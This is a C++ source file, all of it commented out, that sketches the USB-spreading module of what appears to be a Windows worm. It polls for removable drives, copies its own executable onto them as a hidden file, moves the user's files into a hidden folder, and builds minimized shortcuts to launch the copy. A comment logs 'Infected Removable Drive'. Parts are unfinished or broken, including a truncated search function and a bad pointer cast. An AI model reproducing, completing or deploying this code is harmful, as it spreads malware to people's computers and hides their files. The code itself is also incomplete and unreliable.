#include "../Includes/includes.h"
/*
HRESULT CreateShortCut( LPCWSTR wzTargetFile, LPCWSTR wzExecArgs, LPCWSTR wzLnkFile, LPCWSTR wzIconFile )
{
    HRESULT hRes = NULL;

    IShellLinkW* pShellLink;
    IPersistFile* pPersistFile;

    hRes = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (PVOID*)&pShellLink);

    if(SUCCEEDED(hRes))
    {
        hRes = pShellLink->SetPath(wzTargetFile);
        hRes = pShellLink->SetArguments(wzExecArgs);
        hRes = pShellLink->SetDescription(L"");
        hRes = pShellLink->SetShowCmd(SW_SHOWMINNOACTIVE);
        hRes = pShellLink->SetWorkingDirectory(L"");

        if(lstrlenW(wzIconFile) > NULL)
        {
            hRes = pShellLink->SetIconLocation(wzIconFile, NULL);
        }

        hRes = pShellLink->QueryInterface(IID_IPersistFile, (PVOID*)&pPersistFile);

        if(SUCCEEDED(hRes))
        {
            hRes = pPersistFile->Save(wzLnkFile, TRUE);
            pPersistFile->Release();
        }

        pShellLink->Release();
    }

    return hRes;
}
*/
/*
char *DetourDirectory(char *cDrive)
{
    strcat(cDrive, "\\");

    strcat(cDrive, cFileHash);

    if(!DirectoryExists(cDrive))
        return cDrive;
    else
        return (char*)"ERR_ALREADY_EXISTS";
}

bool HandleFileOnUsb(char *cDetourDirectory, char *cFilePath)
{
    char cDrive = cFilePath[0];

    char cDetourPath[MAX_PATH];
    strcpy(cDetourPath, DetourDirectory((char*)cDrive));

    if(strstr("ERR_ALREADY_EXISTS", cDetourPath))
        return FALSE;
    else
    {
        char cNewFilePath[MAX_PATH];
        strcpy(cNewFilePath, cDetourPath);
        strcat(cNewFilePath, "\\");

        char cDetourFilePath[MAX_PATH];
        strcpy(cDetourFilePath, cNewFilePath);
        strcat(cDetourFilePath, cDetourDirectory);
        strcat(cDetourFilePath, ".exe");

        if(!FileExists(cDetourFilePath))
        {
            if(CopyFile(cThisFile, cDetourFilePath, TRUE))
                HideFile(cDetourFilePath);
        }

        char cPathWithoutDrive[MAX_PATH];
        strcpy(cPathWithoutDrive, GetPathWithoutDriveFromFilePath(cFilePath));

        if(!strstr("ERROR_INVALID_PATH", cPathWithoutDrive))
        {
            strcat(cNewFilePath, cPathWithoutDrive);

            if(MoveFileEx(cNewFilePath, cFilePath, MOVEFILE_WRITE_THROUGH))
            {
                //Now create the shortcut to the new file location of the previously existing file at the location you will create the shortcut
            }
        }
        else
            return FALSE;
    }
}

unsigned int SearchDrive(char *cDrivePath, unsigned long ulProcessedFiles) //Function uses recursion to iterate through all directories
{
    WIN32_FIND_DATA d32;
    HANDLE hFindFiles = FindFirstFile(cDrivePath, &d32);

    if(GetLastError() == 2) //ERROR_FILE_NOT_FOUND
        return 0;

    if(hFindFiles == INVALID_HANDLE_VALUE)
        return 0;

    cDrivePath = CharacterReplace(cDrivePath, (char*)"*", (char*)"\0");
}

DWORD WINAPI UsbSpread(LPVOID)
{
    while(!bUninstallProgram)
    {
        DWORD dwDriveMask = GetLogicalDrives();
        TCHAR szDrive[] = ("A:\\");

        if(dwDriveMask != 0)
        {
            while(dwDriveMask)
            {
                if(GetDriveType(szDrive) == DRIVE_REMOVABLE)
                {
                    unsigned long ulProcessedFiles = SearchDrive(szDrive, NULL);

                    //OK: Infected Removable Drive: "A" || Files Processed: 69
                }

                ++szDrive[0];
                dwDriveMask >>= 1;
            }
        }
        Sleep(1);
    }

    return 1;
}
*/
